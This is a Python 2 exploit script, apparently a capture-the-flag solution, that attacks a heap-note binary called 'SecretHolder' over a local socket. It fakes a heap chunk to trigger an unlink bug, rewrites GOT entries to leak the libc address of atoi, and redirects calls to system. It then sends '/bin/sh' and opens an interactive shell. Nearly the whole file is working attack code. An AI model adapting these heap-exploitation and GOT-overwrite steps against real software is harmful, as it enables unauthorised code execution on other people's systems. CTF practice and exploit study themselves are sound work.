from zio import *
from time import sleep

#target = './SecretHolder'
target = ('127.0.0.1',10001)
io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))


big_note_addr       = 0x6020a0
huge_note_addr      = 0x6020a8
small_note_addr     = 0x6020b0
got_atoi_addr       = 0x602070
got_free_addr       = 0x602018
plt_puts_addr       = 0x4006c0
#ubuntu 16.04
offset_system_atoi = 0xe510


def Keep_secret(size,content):
	io.read_until('3. Renew secret')
	io.writeline('1')
	io.read_until('3. Huge secret')
	io.writeline(str(size))
	io.read_until('Tell me your secret:')
	io.writeline(str(content))


def Wipe_secret(size):
	io.read_until('3. Renew secret')
	io.writeline('2')
	io.read_until('3. Huge secret')
	io.writeline(str(size))

def Renew_secret(size,new_content):
	io.read_until('3. Renew secret')
	io.writeline('3')
	io.read_until('3. Huge secret')
	io.writeline(str(size))
	io.read_until('Tell me your secret:')
	io.writeline(str(new_content))


'''
small = 1
big   = 2
huge  = 3
'''

#malloc huge and free it.
Keep_secret(3,"C"*0x100)
Wipe_secret(3)

#malloc small chunk and big chunk.
Keep_secret(1,"A"*0x20)
Keep_secret(2,"B"*0x80)

#free small and big chunk.
Wipe_secret(1)
Wipe_secret(2)


payload  = l64(0x0) + l64(0x30) + l64(huge_note_addr - 0x8 * 3) + l64(huge_note_addr - 0x8 * 2)
# chunk 1 (free'd)
payload += l64(0x20) + l64(0xa0)
payload += 'A' * 0x90
# chunk 2
payload += l64(0x0) + l64(0xa1)
payload += 'A' * 0x90
# chunk 3
payload += l64(0x0) + l64(0xa1)

#raw_input('0x000000000040086D')
Keep_secret(3,payload)

#free big chunk --> unlink bug here.
#raw_input('0x0000000000400A27')
Wipe_secret(2)


#overwrite ptrs on .bss
payload_leak =  "A"*0x10
payload_leak += l64(got_atoi_addr) + l64(got_free_addr) + l64(got_atoi_addr)
payload_leak += l32(0x1)*3
#raw_input('0x0000000000400B1E')
Renew_secret(3,payload_leak)

#overwrite free@got to make info leak.
payload_overwrite = l64(plt_puts_addr) + l64(plt_puts_addr+0x6)
#leak
#raw_input('0x0000000000400B1E')
Renew_secret(3,payload_overwrite)

Wipe_secret(2)
tmp = io.read(8)[1:][::-1][1:][::-1]

leak_atoi_addr = l64(tmp.ljust(8,'\x00'))
print "system addr : 0x%x" % leak_atoi_addr
system_addr = leak_atoi_addr + offset_system_atoi
print "system addr : 0x%x" % system_addr

#raw_input('0x0000000000400B1E')
Renew_secret(1,l64(system_addr))

io.write('/bin/sh\0')

io.interact()